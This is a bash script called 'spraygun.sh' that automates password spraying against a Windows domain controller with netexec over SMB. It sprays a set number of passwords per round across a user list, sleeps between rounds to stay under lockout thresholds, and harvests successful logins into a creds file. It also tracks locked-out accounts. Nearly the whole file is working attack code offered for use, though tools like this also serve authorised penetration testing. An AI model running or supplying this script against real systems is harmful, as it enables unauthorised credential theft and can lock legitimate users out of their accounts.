#!/bin/bash


#need to add locked-out accounts finding
#v0.4
#
## fixed iteration break
## added timer on screen
## fixed password parsing and displaying
## added spaces and delimeters for readability

#usage : ./spraygun.sh dc-ip userlist.txt passwords.txt sleep-in-mins passwords-per-round 

#script to auto-spray with cme
# going to add failsafe for account lockouts to wait for user confirmation before spraying the network and locking out all the users

# $1 - dc-ip
# $2 - user list
# $3 - password list
# $4 - sleep timer
# $5 - passwords per


########################
#WORKING
########################

#IN LOCKEDOUT (needs to pair with nxc spray to create a single log per spray)
 	# need to only cat out latest spray
  	# might use something like : ls -Art | tail -n 1
   	# list -A: all except . ..; -r: reverse order; -t: by time
    	# or 
     	# ls -t | head -n1
      	# LATEST_SPRAY=$(ls -t | head -n1)
	# cat $LATEST_SPRAY | grep -ai 'LOCKED_OUT' | awk -F " " '{print $11}' | awk -F "\\" '{print $2}' | awk -F ":" '{print $1}' | sort -u > lockedout.users
 	# cat lockedout.users | tee -a historical-lockedout.users.bak
  	# rm lockedout.users

#IN SPRAY LOOP
	#nxc smb $1 -u $2 -p $pass --continue-on-success --log spraygun-$pass-log.log
 	# LATEST_SPRAY=spraygun-$pass-log.log
  	# outside of loop for global var, which is needed as latest file to parse with lockedout users
   	# below is responding to the second most recent file, which should be the spray-$pass-log.log and putting in global var for lockedout.users
  	# LATEST_SPRAY=$(ls -t | sed -n '2p')

##########################################
#### checking for args
##########################################
if [ $# -ne 5 ]; then
	echo 'Usage: spraygun.sh dc-ip users-list pass-list sleep-time-in-mins passwords-per-round'
	echo 'Example: ./spraygun.sh 10.10.10.10 users.txt passwords.txt 35 2'
	exit -1
fi




#############################################
# timer func is used to display seconds onto the screen; being used to countdown for spray for more accurate tracking.
#############################################
#used for sleeping the amount of time specified by user
sleep_timer="sleep $4m" 

#pulling arg 4 into a var for timer() function
sleeping=$4 

timer()
{
secs=$(($sleeping * 60))
while [ $secs -gt 0 ]; do
   echo -ne "$secs\033[0K\r"
   sleep 1
   : $((secs--))
done
}


#############################################
# locked out func used to fail safe too many account lock outs.
#############################################
locked_out() 
{
	
if [[ $lockedout_count -gt 2 ]]; then
	while true; do

	echo ""
	echo "Found locked out accounts."
	echo " "
	echo "Press c to continue spraying or q to quit"
	echo ""

	#read user input into var $key
	read -s -n 1 key

		case $key in
				
			[cC])
				echo "Continuing"
				echo ""
				cat lockedout.users >> lockedout.users.bak
				rm lockedout.users
				break
				;;
			[qQ])
				echo "Quitting"
				exit 0
				;;
			*)
				echo "select c or q"
				;;
		esac

	done

fi

}


##########################################
#### Making files
##########################################

touch ./creds.txt 
touch ./used-passwords.txt
touch ./tmp-creds.txt
touch ./passwords-in-queue.txt 
touch ./tmp.txt

#starting the line count for the while loop
count=$(wc -l < $3)

# this could probably be just cat $3 > tmp.txt but I like to party
head -n $count $3 > passwords-in-queue.txt


# while loop to loop through passwords file, twice per loop
# going to try and add how many times per loop a user wants

##########################################
#### Spray loop
##########################################

echo "Starting password spray with $5 passwords every $4 mins"
while [ $count -gt 0 ]; do
	
	# parses top two passwords from tmp.txt and sprays with netexec ; logs to spraygun-log.log	
	for pass in $(cat passwords-in-queue.txt | head -$5); do
		echo ''
		echo '############################'
		date
		echo "Spraying: $pass"
		echo '############################'
		echo ''
		nxc smb $1 -u $2 -p $pass --continue-on-success --log spraygun-log.log
		echo $pass >> ./used-passwords.txt
		
		# sleep buffer because I like time
		sleep 5

	done
	
##########################################
#### Creds
##########################################

	# prints creds found to screen and to tmp-creds.txt ; then sorts uniquely and puts into creds.txt
	cat spraygun-log.log | grep -ai '[+]' | awk -F " " '{print $13}' >> tmp-creds.txt
	sort -u tmp-creds.txt > creds.txt 
	echo ''
	echo '############################'
	date
	echo "Found creds: "
	cat creds.txt
	echo '############################'
	echo "--Creds in creds.txt--"
	echo ''
	
##########################################
#### LOCKOUT
##########################################


	cat spraygun-log.log | grep -ai 'LOCKED_OUT' | awk -F " " '{print $13}' | awk -F "\\" '{print $2}' | awk -F ":" '{print $1}' | sort -u > lockedout.users
	# sed delete for lockedout.users cmp lockedout.users.bak
	lockedout_count=$(wc -l < lockedout.users)
	echo ''
	echo ''
	echo '*******************************'
	date
	echo "Account lockouts found : "
	cat lockedout.users
	if [ $lockedout_count -eq 0 ]; then
		echo "none"
	fi
	echo '*******************************'
	echo ''
	echo ''
	# locked_out
	# function needs to be less strict on lockedout users

	
##########################################
#### File edits to reset loop
##########################################
	#removes top to lines from tmp.txt so the loop can start at the top of tmp.txt with two new passwords
	sed -i "1,$5d" passwords-in-queue.txt
	
	#updating count -- will be used to break out of loop cleanly when no more lines
	count=$(wc -l < passwords-in-queue.txt)
	
	# if loop to break out cleanly after end of file versus waiting until end of next loop
	if [ $count == 0 ]
	then
		break
	fi
	
##########################################
#### Sleep & countdown
##########################################
	# sleep set up for time provided and countdown
	echo "sleeping for $4 mins"
	echo ''
	echo "Time until next spray (seconds): " 
	# sleep for specified minutes and fancy countdown timer func
	$sleep_timer & timer
	echo ''
	echo ''


done

echo "End of file, check your creds!"

# add expired password finder for changes
# add account disabled finder 
